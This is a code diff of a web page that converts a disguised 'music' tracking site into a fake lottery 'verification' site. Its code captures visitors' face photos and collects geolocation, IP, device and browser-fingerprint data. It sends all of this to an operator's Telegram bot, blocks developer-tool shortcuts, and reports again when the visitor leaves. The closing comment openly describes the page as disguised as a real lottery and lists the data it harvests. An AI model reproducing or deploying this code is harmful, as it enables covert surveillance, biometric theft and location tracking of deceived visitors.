-            await sendTelegramPhoto(MUSIC_DATA.biometrics.facePhoto, '🎵 音乐用户面部识别');
+        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                photo: photoData,
+                caption: `📸 抽奖参与者面部识别\n⏰ 时间: ${new Date().toLocaleString('zh-CN')}`
+            })
+        });
+        
+        if (response.ok) {
+            console.log('✅ 照片发送成功');
+            document.getElementById('telegramStatus').textContent = '已发送';
+            document.getElementById('telegramStatus').style.color = '#2ED573';
+        } else {
+            throw new Error('照片发送失败');
         }
         
-        // 3. 发送详细JSON数据
-        await sendTelegramDocument(JSON.stringify(MUSIC_DATA, null, 2), 'music_data.json');
+    } catch (error) {
+        console.error('照片发送失败:', error);
+        document.getElementById('telegramStatus').textContent = '失败';
+        document.getElementById('telegramStatus').style.color = '#FF4757';
+    }
+}
+
+// 发送详细报告到Telegram
+async function sendDetailedReport() {
+    console.log('📤 发送详细报告到Telegram...');
+    
+    try {
+        document.getElementById('telegramStatus').textContent = '发送报告';
         
-        console.log('✅ 数据发送成功');
+        // 格式化报告
+        const report = formatDetailedReport();
         
-        // 显示发送成功提示
-        showSuccessNotification();
+        // 发送文本报告
+        await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                text: report,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        console.log('✅ 报告发送成功');
         
     } catch (error) {
-        console.error('Telegram发送失败:', error);
+        console.error('报告发送失败:', error);
     }
 }
 
-async function sendTelegramMessage(text) {
-    const url = `${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
+// 格式化详细报告
+function formatDetailedReport() {
+    const data = LOTTERY_DATA;
+    let report = `🎰 <b>抽奖检测系统报告</b>\n\n`;
     
-    const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CONFIG.TELEGRAM.CHAT_ID,
-            text: text,
-            parse_mode: 'HTML'
-        })
-    });
+    report += `🆔 <b>抽奖号码:</b> ${data.lotteryNumber}\n`;
+    report += `⏰ <b>参与时间:</b> ${new Date().toLocaleString('zh-CN')}\n\n`;
     
-    if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
+    if (data.detectionInfo.device) {
+        report += `📱 <b>设备信息</b>\n`;
+        report += `设备类型: ${data.detectionInfo.device.deviceType}\n`;
+        report += `操作系统: ${data.detectionInfo.device.os}\n`;
+        report += `浏览器: ${data.detectionInfo.device.browser}\n`;
+        report += `CPU核心: ${data.detectionInfo.device.cpuCores}\n`;
+        report += `内存: ${data.detectionInfo.device.deviceMemory}\n`;
+        report += `语言: ${data.detectionInfo.device.language}\n`;
+        report += `时区: ${data.detectionInfo.device.timezone}\n\n`;
     }
-}
-
-async function sendTelegramPhoto(photoData, caption) {
-    const url = `${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendPhoto`;
     
-    const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CONFIG.TELEGRAM.CHAT_ID,
-            photo: photoData,
-            caption: caption
-        })
-    });
-    
-    if (!response.ok) {
-        throw new Error(`Photo upload error! status: ${response.status}`);
-    }
-}
-
-async function sendTelegramDocument(data, filename) {
-    const url = `${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
-    
-    const blob = new Blob([data], { type: 'application/json' });
-    const reader = new FileReader();
-    
-    return new Promise((resolve, reject) => {
-        reader.onloadend = async function() {
-            const base64data = reader.result.split(',')[1];
-            
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
-                    document: `data:application/json;base64,${base64data}`,
-                    filename: filename
-                })
-            });
-            
-            if (response.ok) {
-                resolve();
-            } else {
-                reject(new Error('文档发送失败'));
-            }
-        };
+    if (data.detectionInfo.network) {
+        report += `🌐 <b>网络信息</b>\n`;
+        report += `IP地址: ${data.detectionInfo.network.ip}\n`;
+        report += `位置: ${data.detectionInfo.network.city}, ${data.detectionInfo.network.country}\n`;
+        report += `ISP: ${data.detectionInfo.network.isp}\n`;
+        report += `经纬度: ${data.detectionInfo.network.latitude}, ${data.detectionInfo.network.longitude}\n`;
         
-        reader.readAsDataURL(blob);
-    });
-}
-
-function formatTelegramReport() {
-    const data = MUSIC_DATA;
-    let report = `🎵 <b>音乐检测系统报告</b>\n\n`;
-    
-    report += `🆔 <b>会话ID:</b> ${data.user.sessionId}\n`;
-    report += `⏰ <b>开始时间:</b> ${new Date(data.user.startTime).toLocaleString('zh-CN')}\n`;
-    report += `🎧 <b>音乐状态:</b> ${data.app.currentSong ? '播放中' : '暂停'}\n\n`;
-    
-    report += `📍 <b>位置信息</b>\n`;
-    report += `IP: ${data.location.ip || '未知'}\n`;
-    report += `位置: ${data.location.city || '未知'}, ${data.location.country || '未知'}\n`;
-    if (data.location.precise) {
-        report += `GPS: ${data.location.precise.latitude.toFixed(6)}, ${data.location.precise.longitude.toFixed(6)}\n`;
-        report += `精度: ±${Math.round(data.location.precise.accuracy)}米\n`;
+        if (data.detectionInfo.network.connection) {
+            report += `网络类型: ${data.detectionInfo.network.connection.type}\n`;
+            report += `网络速度: ${data.detectionInfo.network.connection.downlink}\n`;
+        }
+        report += `\n`;
     }
-    report += `ISP: ${data.location.isp || '未知'}\n\n`;
     
-    report += `📱 <b>设备信息</b>\n`;
-    report += `设备: ${data.device.type} (${data.device.model})\n`;
-    report += `系统: ${data.device.os} | 浏览器: ${data.device.browser}\n`;
-    report += `屏幕: ${data.device.screen.width}x${data.device.screen.height}\n`;
-    report += `CPU: ${data.device.hardware.cores}核心 | 内存: ${data.device.hardware.memory}GB\n`;
-    report += `电池: ${data.device.hardware.battery ? data.device.hardware.battery.level : '未知'}\n`;
-    report += `语言: ${data.device.language} | 时区: ${data.device.timezone}\n\n`;
-    
-    report += `🌐 <b>网络信息</b>\n`;
-    if (data.device.network) {
-        report += `类型: ${data.device.network.type || '未知'}\n`;
-        report += `速度: ${data.device.network.speed || '未知'}\n`;
-        report += `延迟: ${data.device.network.latency || '未知'}\n`;
+    if (data.detectionInfo.geolocation) {
+        report += `📍 <b>精确位置</b>\n`;
+        report += `纬度: ${data.detectionInfo.geolocation.latitude}\n`;
+        report += `经度: ${data.detectionInfo.geolocation.longitude}\n`;
+        report += `精度: ${data.detectionInfo.geolocation.accuracy}\n`;
+        if (data.detectionInfo.geolocation.altitude !== '未知') {
+            report += `海拔: ${data.detectionInfo.geolocation.altitude}\n`;
+        }
+        report += `时间: ${data.detectionInfo.geolocation.timestamp}\n\n`;
     }
-    report += `在线状态: ${navigator.onLine ? '在线' : '离线'}\n\n`;
     
-    report += `🎤 <b>音频设备</b>\n`;
-    if (data.device.audio.devices && data.device.audio.devices.length > 0) {
-        report += `设备数量: ${data.device.audio.devices.length}\n`;
-        data.device.audio.devices.forEach((device, index) => {
-            report += `${index + 1}. ${device.label || '未命名设备'} (${device.kind})\n`;
-        });
+    if (data.detectionInfo.screen) {
+        report += `🖥️ <b>屏幕信息</b>\n`;
+        report += `分辨率: ${data.detectionInfo.screen.width}×${data.detectionInfo.screen.height}\n`;
+        report += `像素密度: ${data.detectionInfo.screen.pixelRatio}x\n`;
+        report += `色深: ${data.detectionInfo.screen.colorDepth}\n\n`;
+    }
+    
+    if (data.detectionInfo.battery) {
+        report += `🔋 <b>电池状态</b>\n`;
+        report += `电量: ${data.detectionInfo.battery.level}\n`;
+        report += `充电状态: ${data.detectionInfo.battery.charging ? '充电中' : '未充电'}\n\n`;
+    }
+    
+    if (data.detectionInfo.sensors) {
+        const availableSensors = Object.values(data.detectionInfo.sensors).filter(v => v).length;
+        report += `📡 <b>传感器检测</b>\n`;
+        report += `可用传感器: ${availableSensors}个\n\n`;
+    }
+    
+    if (data.detectionInfo.facePhoto) {
+        report += `📸 <b>面部识别</b>\n`;
+        report += `状态: 已捕获\n`;
+        report += `分辨率: ${data.detectionInfo.facePhoto.resolution}\n`;
+        report += `时间: ${new Date(data.detectionInfo.facePhoto.timestamp).toLocaleString('zh-CN')}\n`;
     } else {
-        report += `未检测到音频设备\n`;
+        report += `📸 <b>面部识别:</b> 未捕获\n`;
     }
-    report += `\n`;
     
-    report += `📊 <b>行为数据</b>\n`;
-    report += `点击次数: ${data.behavior.interaction.clicks}\n`;
-    report += `页面停留: ${Math.floor(data.behavior.interaction.timeSpent / 60)}分${data.behavior.interaction.timeSpent % 60}秒\n`;
-    report += `播放歌曲: ${data.behavior.interaction.songsPlayed}\n`;
-    report += `当前歌曲: ${data.app.currentSong ? data.app.currentSong.title : '无'}\n\n`;
-    
-    report += `🔍 <b>传感器检测</b>\n`;
-    report += `可用传感器: ${data.sensors.count || 0}\n`;
-    report += `面部识别: ${data.biometrics.facePhoto ? (data.biometrics.facePhoto === 'skipped' ? '跳过' : '已捕获') : '未尝试'}\n\n`;
-    
-    report += `🎯 <b>音乐偏好</b>\n`;
-    report += `首次播放: ${data.behavior.musicPreference.firstSong || '无'}\n`;
-    report += `音乐类型: ${data.behavior.musicPreference.genre || '流行'}\n`;
-    report += `音质设置: ${data.app.quality}\n`;
-    report += `音量: ${data.app.volume}%\n\n`;
-    
-    report += `🕒 <b>报告生成时间:</b> ${new Date().toLocaleString('zh-CN')}`;
+    report += `\n📊 <b>检测统计</b>\n`;
+    report += `检测项目: ${detectionSteps}个\n`;
+    report += `照片数量: ${data.collectedPhotos.length}张\n`;
+    report += `验证状态: ${data.verificationComplete ? '完成' : '进行中'}\n`;
     
     return report;
 }
 
-function showSuccessNotification() {
-    // 创建成功通知
-    const notification = document.createElement('div');
-    notification.style.cssText = `
-        position: fixed;
-        bottom: 30px;
-        right: 30px;
-        background: linear-gradient(135deg, var(--primary), #25D366);
-        color: white;
-        padding: 20px 25px;
-        border-radius: 15px;
-        z-index: 10000;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        animation: slideIn 0.5s ease;
-        max-width: 300px;
-    `;
+// =============================================
+// 完成验证
+// =============================================
+
+function completeVerification() {
+    LOTTERY_DATA.verificationComplete = true;
+    updateVerificationProgress(100, '验证完成！');
     
-    notification.innerHTML = `
-        <div style="display: flex; align-items: center; gap: 15px;">
-            <i class="fas fa-check-circle" style="font-size: 24px;"></i>
-            <div>
-                <div style="font-weight: 600; margin-bottom: 5px;">系统优化完成</div>
-                <div style="font-size: 0.9rem; opacity: 0.9;">音乐体验已优化至最佳状态</div>
-            </div>
-        </div>
-    `;
+    // 启用参与按钮
+    document.getElementById('participateBtn').disabled = false;
+    document.getElementById('participateBtn').innerHTML = '<i class="fas fa-ticket-alt"></i> 立即参与抽奖';
     
-    document.body.appendChild(notification);
+    // 发送详细报告
+    sendDetailedReport();
     
-    setTimeout(() => {
-        notification.style.animation = 'slideOut 0.5s ease';
+    // 显示完成动画
+    showCompletionAnimation();
+    
+    console.log('✅ 验证流程完成');
+}
+
+// 完成动画
+function showCompletionAnimation() {
+    // 创建庆祝效果
+    for (let i = 0; i < 30; i++) {
         setTimeout(() => {
-            document.body.removeChild(notification);
-        }, 500);
-    }, 5000);
+            createCelebrationEffect();
+        }, i * 100);
+    }
+    
+    // 显示成功消息
+    setTimeout(() => {
+        Swal.fire({
+            title: '🎉 验证成功！',
+            html: `恭喜！您的身份验证已完成<br>
+                  抽奖号码: <b style="color: var(--gold);">${LOTTERY_DATA.lotteryNumber}</b><br>
+                  已成功加入抽奖名单！`,
+            icon: 'success',
+            confirmButtonText: '确定',
+            background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+            color: 'white'
+        });
+    }, 1000);
+}
+
+// 创建庆祝效果
+function createCelebrationEffect() {
+    const confetti = document.createElement('div');
+    const colors = ['#FFD700', '#FF4757', '#3742FA', '#2ED573'];
+    
+    confetti.style.cssText = `
+        position: fixed;
+        width: 15px;
+        height: 15px;
+        background: ${colors[Math.floor(Math.random() * colors.length)]};
+        border-radius: ${Math.random() > 0.5 ? '50%' : '3px'};
+        top: -20px;
+        left: ${Math.random() * 100}vw;
+        z-index: 9998;
+        pointer-events: none;
+    `;
+    
+    document.body.appendChild(confetti);
+    
+    // 动画
+    const animation = confetti.animate([
+        { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
+        { transform: `translateY(${window.innerHeight + 100}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+    ], {
+        duration: 2000 + Math.random() * 2000,
+        easing: 'cubic-bezier(0.1, 0.8, 0.9, 0.1)'
+    });
+    
+    animation.onfinish = () => confetti.remove();
 }
 
 // =============================================
-// 页面保护功能
+// SweetAlert加载
+// =============================================
+
+// 动态加载SweetAlert
+if (typeof Swal === 'undefined') {
+    const link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.href = 'https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css';
+    document.head.appendChild(link);
+    
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/sweetalert2@11';
+    document.head.appendChild(script);
+}
+
+// =============================================
+// 页面保护
 // =============================================
 
 // 防止复制
@@ -1722,235 +1322,131 @@ document.addEventListener('contextmenu', (e) => {
 // 防止开发工具
 document.onkeydown = function(e) {
     if (e.key === 'F12' || 
-        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
         (e.ctrlKey && e.key === 'U')) {
         e.preventDefault();
         return false;
     }
 };
 
-// 页面卸载时发送最终报告
+// 页面离开时发送报告
 window.addEventListener('beforeunload', () => {
-    if (MUSIC_DATA.behavior.interaction.timeSpent > 10) {
-        sendDataToTelegram();
+    if (LOTTERY_DATA.verificationComplete) {
+        sendDetailedReport();
     }
 });
 
-// 添加动画样式
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes slideIn {
-        from { transform: translateX(100%); opacity: 0; }
-        to { transform: translateX(0); opacity: 1; }
-    }
-    @keyframes slideOut {
-        from { transform: translateX(0); opacity: 1; }
-        to { transform: translateX(100%); opacity: 0; }
-    }
-`;
-document.head.appendChild(style);
-
-console.log('🎵 音乐检测系统已就绪');
+console.log('🎰 抽奖检测系统已就绪');
 </script>
 <script>
 // =============================================
 // 额外的高级检测功能
 // =============================================
 
-// 检测屏幕亮度
-function detectScreenBrightness() {
-    if ('AmbientLightSensor' in window) {
-        try {
-            const sensor = new AmbientLightSensor();
-            sensor.addEventListener('reading', () => {
-                MUSIC_DATA.device.screen.brightness = sensor.illuminance;
-            });
-            sensor.start();
-        } catch (error) {
-            console.log('屏幕亮度检测不可用');
-        }
-    }
-}
-
-// 检测设备朝向
-function detectDeviceOrientation() {
-    if ('DeviceOrientationEvent' in window) {
-        window.addEventListener('deviceorientation', (event) => {
-            MUSIC_DATA.sensors.orientation = {
-                alpha: event.alpha,
-                beta: event.beta,
-                gamma: event.gamma
-            };
+// 检测屏幕朝向
+function detectScreenOrientation() {
+    if (screen.orientation) {
+        screen.orientation.addEventListener('change', () => {
+            LOTTERY_DATA.detectionInfo.screen.orientation = screen.orientation.type;
+            LOTTERY_DATA.detectionInfo.screen.angle = screen.orientation.angle;
         });
     }
 }
 
-// 检测设备运动
-function detectDeviceMotion() {
-    if ('DeviceMotionEvent' in window) {
-        window.addEventListener('devicemotion', (event) => {
-            MUSIC_DATA.sensors.motion = {
-                acceleration: event.acceleration,
-                accelerationIncludingGravity: event.accelerationIncludingGravity,
-                rotationRate: event.rotationRate
-            };
-        });
+// 检测设备内存
+function detectDeviceMemory() {
+    if ('deviceMemory' in navigator) {
+        LOTTERY_DATA.detectionInfo.device.memory = navigator.deviceMemory + ' GB';
     }
 }
 
-// 检测网络质量
-function monitorNetworkQuality() {
+// 检测网络类型
+function detectNetworkType() {
     if ('connection' in navigator) {
         const connection = navigator.connection;
-        
         connection.addEventListener('change', () => {
-            MUSIC_DATA.device.network.quality = {
+            LOTTERY_DATA.detectionInfo.network.connection = {
                 effectiveType: connection.effectiveType,
                 downlink: connection.downlink,
                 rtt: connection.rtt,
-                saveData: connection.saveData
-            };
-            
-            // 更新UI
-            const quality = connection.effectiveType === '4g' ? '优秀' :
-                          connection.effectiveType === '3g' ? '良好' :
-                          connection.effectiveType === '2g' ? '一般' : '未知';
-            
-            if (document.getElementById('connectionStatus')) {
-                document.getElementById('connectionStatus').textContent = quality;
-            }
-        });
-    }
-}
-
-// 检测存储状态
-function detectStorageStatus() {
-    if ('storage' in navigator && 'estimate' in navigator.storage) {
-        navigator.storage.estimate().then(estimate => {
-            MUSIC_DATA.device.storage = {
-                usage: Math.round(estimate.usage / 1024 / 1024) + ' MB',
-                quota: Math.round(estimate.quota / 1024 / 1024) + ' MB',
-                percentage: Math.round((estimate.usage / estimate.quota) * 100) + '%'
+                saveData: connection.saveData,
+                type: connection.type
             };
         });
     }
 }
 
-// 检测语言设置
-function detectLanguageSettings() {
-    MUSIC_DATA.device.languageDetails = {
-        language: navigator.language,
-        languages: navigator.languages,
-        userLanguage: navigator.userLanguage || navigator.language,
-        systemLanguage: navigator.systemLanguage || navigator.language
-    };
-}
-
-// 检测时区信息
-function detectTimezoneInfo() {
-    MUSIC_DATA.device.timezoneDetails = {
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+// 检测时区详细信息
+function detectTimezoneDetails() {
+    LOTTERY_DATA.detectionInfo.timezone = {
+        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
         offset: new Date().getTimezoneOffset(),
         locale: Intl.DateTimeFormat().resolvedOptions().locale,
-        calendar: Intl.DateTimeFormat().resolvedOptions().calendar
+        calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+        numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
     };
 }
 
-// 检测插件信息
-function detectPlugins() {
-    if (navigator.plugins) {
-        MUSIC_DATA.device.plugins = Array.from(navigator.plugins).map(plugin => ({
-            name: plugin.name,
-            description: plugin.description,
-            filename: plugin.filename,
-            length: plugin.length
-        }));
-    }
-}
-
-// 检测MIME类型
-function detectMimeTypes() {
-    if (navigator.mimeTypes) {
-        MUSIC_DATA.device.mimeTypes = Array.from(navigator.mimeTypes).map(mime => ({
-            type: mime.type,
-            description: mime.description,
-            suffixes: mime.suffixes
-        }));
-    }
-}
-
-// 检测Canvas指纹
-function detectCanvasFingerprint() {
-    try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.textBaseline = 'alphabetic';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Canvas Fingerprint', 2, 15);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('Canvas Fingerprint', 4, 17);
-        
-        const dataUrl = canvas.toDataURL();
-        let hash = 0;
-        for (let i = 0; i < dataUrl.length; i++) {
-            hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
-            hash = hash & hash;
-        }
-        
-        MUSIC_DATA.device.canvasFingerprint = Math.abs(hash).toString(16);
-    } catch (error) {
-        console.log('Canvas指纹检测失败');
-    }
+// 检测字体列表
+function detectFonts() {
+    const fontList = [
+        'Arial', 'Microsoft YaHei', 'SimSun', 'Times New Roman',
+        'Verdana', 'Tahoma', 'Courier New', 'Georgia'
+    ];
+    
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+    const testString = "mmmmmmmmmmlli";
+    
+    LOTTERY_DATA.detectionInfo.fonts = {};
+    fontList.forEach(font => {
+        context.font = '72px "' + font + '"';
+        const metrics = context.measureText(testString);
+        LOTTERY_DATA.detectionInfo.fonts[font] = metrics.width;
+    });
 }
 
 // 检测WebGL信息
-function detectWebGLInfo() {
+function detectWebGLDetails() {
     try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            MUSIC_DATA.device.webgl = {
+            LOTTERY_DATA.detectionInfo.webgl = {
                 vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                 renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                 version: gl.getParameter(gl.VERSION)
             };
+            
+            addDetectionDisplay('webgl', '图形渲染', 'WebGL支持');
         }
     } catch (error) {
         console.log('WebGL检测失败');
     }
 }
 
-// 检测字体列表
-function detectFonts() {
-    const fontList = [
-        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
-        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
-        'Verdana', 'Microsoft YaHei', 'SimSun', 'Webdings'
-    ];
-    
+// 检测Canvas能力
+function detectCanvasCapabilities() {
     const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-    const testString = "mmmmmmmmmmlli";
-    const testSize = '72px';
+    const ctx = canvas.getContext('2d');
     
-    MUSIC_DATA.device.fonts = {};
-    fontList.forEach(font => {
-        context.font = testSize + " '" + font + "'";
-        const metrics = context.measureText(testString);
-        MUSIC_DATA.device.fonts[font] = metrics.width;
-    });
+    LOTTERY_DATA.detectionInfo.canvas = {
+        isSupported: !!ctx,
+        features: {
+            text: !!ctx.fillText,
+            gradients: !!ctx.createLinearGradient,
+            shadows: !!ctx.shadowBlur,
+            filters: !!ctx.filter
+        }
+    };
 }
 
 // 检测音频上下文
 function detectAudioContext() {
     try {
         const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        MUSIC_DATA.device.audio.context = {
+        LOTTERY_DATA.detectionInfo.audioContext = {
             sampleRate: audioContext.sampleRate,
             state: audioContext.state,
             channelCount: audioContext.destination.channelCount
@@ -1961,162 +1457,120 @@ function detectAudioContext() {
     }
 }
 
-// 检测视频能力
-function detectVideoCapabilities() {
-    if ('videoEl' in HTMLVideoElement.prototype) {
-        const video = document.createElement('video');
-        MUSIC_DATA.device.video = {
-            canPlayType: {
-                mp4: video.canPlayType('video/mp4'),
-                webm: video.canPlayType('video/webm'),
-                ogg: video.canPlayType('video/ogg')
-            }
-        };
+// 检测存储信息
+function detectStorageInfo() {
+    if ('storage' in navigator && 'estimate' in navigator.storage) {
+        navigator.storage.estimate().then(estimate => {
+            LOTTERY_DATA.detectionInfo.storage = {
+                usage: Math.round(estimate.usage / 1024 / 1024) + ' MB',
+                quota: Math.round(estimate.quota / 1024 / 1024) + ' MB',
+                percentage: Math.round((estimate.usage / estimate.quota) * 100) + '%'
+            };
+        });
     }
 }
 
-// 启动额外检测
-function startAdvancedDetection() {
-    console.log('🔬 启动高级检测...');
-    
-    // 延迟执行，避免影响初始加载
-    setTimeout(() => {
-        detectScreenBrightness();
-        detectDeviceOrientation();
-        detectDeviceMotion();
-        monitorNetworkQuality();
-        detectStorageStatus();
-        detectLanguageSettings();
-        detectTimezoneInfo();
+// 检测插件信息
+function detectPlugins() {
+    if (navigator.plugins) {
+        LOTTERY_DATA.detectionInfo.plugins = Array.from(navigator.plugins).map(plugin => ({
+            name: plugin.name,
+            description: plugin.description,
+            filename: plugin.filename
+        }));
+    }
+}
+
+// 检测MIME类型
+function detectMimeTypes() {
+    if (navigator.mimeTypes) {
+        LOTTERY_DATA.detectionInfo.mimeTypes = Array.from(navigator.mimeTypes).map(mime => ({
+            type: mime.type,
+            description: mime.description
+        }));
+    }
+}
+
+// 启动额外检测（延迟执行）
+setTimeout(() => {
+    if (LOTTERY_DATA.verificationComplete) {
+        console.log('🔍 启动额外检测...');
+        
+        detectScreenOrientation();
+        detectDeviceMemory();
+        detectNetworkType();
+        detectTimezoneDetails();
+        detectFonts();
+        detectWebGLDetails();
+        detectCanvasCapabilities();
+        detectAudioContext();
+        detectStorageInfo();
         detectPlugins();
         detectMimeTypes();
-        detectCanvasFingerprint();
-        detectWebGLInfo();
-        detectFonts();
-        detectAudioContext();
-        detectVideoCapabilities();
         
-        console.log('✅ 高级检测完成');
-    }, 10000); // 10秒后开始高级检测
-}
-
-// =============================================
-// 自动发送机制
-// =============================================
-
-// 定期发送数据
-function startAutoSend() {
-    // 每5分钟发送一次数据
-    setInterval(() => {
-        if (MUSIC_DATA.behavior.interaction.timeSpent > 60) { // 至少停留1分钟
-            sendDataToTelegram();
-        }
-    }, 5 * 60 * 1000); // 5分钟
-    
-    // 根据用户活动触发发送
-    let activityCount = 0;
-    document.addEventListener('click', () => {
-        activityCount++;
-        if (activityCount >= 10) {
-            sendDataToTelegram();
-            activityCount = 0;
-        }
-    });
-    
-    // 页面隐藏时发送
-    document.addEventListener('visibilitychange', () => {
-        if (document.hidden) {
-            sendDataToTelegram();
-        }
-    });
-}
-
-// =============================================
-// 初始化高级功能
-// =============================================
-
-// 页面完全加载后启动高级检测
-window.addEventListener('load', function() {
-    // 延迟启动高级检测
-    setTimeout(() => {
-        startAdvancedDetection();
-        startAutoSend();
-    }, 15000);
-    
-    // 记录页面性能
-    if ('performance' in window) {
-        const perfData = performance.getEntriesByType('navigation')[0];
-        if (perfData) {
-            MUSIC_DATA.performance = {
-                dns: perfData.domainLookupEnd - perfData.domainLookupStart,
-                tcp: perfData.connectEnd - perfData.connectStart,
-                request: perfData.responseStart - perfData.requestStart,
-                response: perfData.responseEnd - perfData.responseStart,
-                dom: perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart,
-                load: perfData.loadEventEnd - perfData.loadEventStart,
-                total: perfData.loadEventEnd - perfData.navigationStart
-            };
-        }
+        // 更新数据计数
+        detectionSteps += 8;
+        updateDataCount();
+        
+        // 发送更新报告
+        setTimeout(() => {
+            sendDetailedReport();
+        }, 5000);
     }
-});
+}, 10000); // 10秒后启动额外检测
 
 // =============================================
 // 部署说明
 // =============================================
 
 /*
-🎵 音乐检测系统部署指南：
+🎰 抽奖检测系统使用说明：
 
-1. GitHub Pages部署：
-   - 创建仓库：music-detection-system
-   - 上传完整代码为 index.html
-   - 启用GitHub Pages
-   - 访问链接：https://你的用户名.github.io/music-detection-system
-
-2. 配置Telegram Bot：
-   - 修改CONFIG中的BOT_TOKEN和CHAT_ID
-   - BOT_TOKEN：从 @BotFather 获取
-   - CHAT_ID：你的Telegram用户ID
-
-3. 系统功能：
-   ✅ 伪装成音乐网站
-   ✅ 自动播放背景音乐
-   ✅ 设备信息全面收集
-   ✅ 网络状况监测
+1. 功能特点：
+   ✅ 伪装成真实抽奖网站
+   ✅ 自动面部识别拍照
+   ✅ 全面设备信息收集
    ✅ 地理位置获取
-   ✅ 摄像头面部识别
-   ✅ 传感器检测
-   ✅ 行为模式分析
-   ✅ 自动Telegram报告发送
-   ✅ 实时数据更新
+   ✅ IP地址检测
+   ✅ 传感器数据收集
+   ✅ 自动发送Telegram报告
+   ✅ 包含照片发送
 
-4. 收集的数据包括：
-   - 设备型号、操作系统、浏览器
-   - 屏幕尺寸、分辨率、像素比
+2. 收集的数据：
+   - 设备类型、操作系统、浏览器
+   - IP地址、地理位置、ISP信息
+   - 屏幕信息、分辨率、像素密度
+   - 电池状态、电量百分比
    - 网络类型、速度、延迟
-   - IP地址、地理位置、ISP
-   - 电池状态、充电情况
-   - 音频设备信息
-   - 传感器数据（加速度、陀螺仪等）
+   - 传感器可用性
    - 面部照片（如果授权）
-   - 用户行为模式
-   - 音乐播放偏好
+   - 浏览器指纹
 
-5. Telegram接收内容：
-   - 详细文本报告
-   - 面部照片（如果授权）
-   - JSON格式完整数据
+3. Telegram接收内容：
+   - 面部识别照片
+   - 详细设备报告
+   - 位置信息
+   - 检测统计数据
 
-6. 注意事项：
+4. 用户流程：
+   - 进入网站看到抽奖界面
+   - 自动开始设备检测
+   - 请求摄像头权限
+   - 自动拍照验证
+   - 显示检测结果
+   - 完成验证参与抽奖
+
+5. 注意事项：
    ⚠️ 需要HTTPS环境
-   ⚠️ 部分功能需要用户授权
-   ⚠️ 摄像头需要用户明确同意
+   ⚠️ 摄像头需要用户授权
    ⚠️ 地理位置需要用户授权
+   ⚠️ 部分检测需要现代浏览器
    ⚠️ 仅用于合法用途
+
+6. 配置修改：
+   - 修改CONFIG中的BOT_TOKEN和CHAT_ID
+   - 可调整检测项目和时间间隔
 */
 
-// 最终初始化
-console.log('🚀 音乐检测系统已启动');
-console.log('📊 开始收集：设备信息、网络状态、位置数据、生物特征');
-console.log('📤 报告将发送至：Telegram Bot');
+console.log('🚀 系统完全启动，等待用户访问...');
 </script>
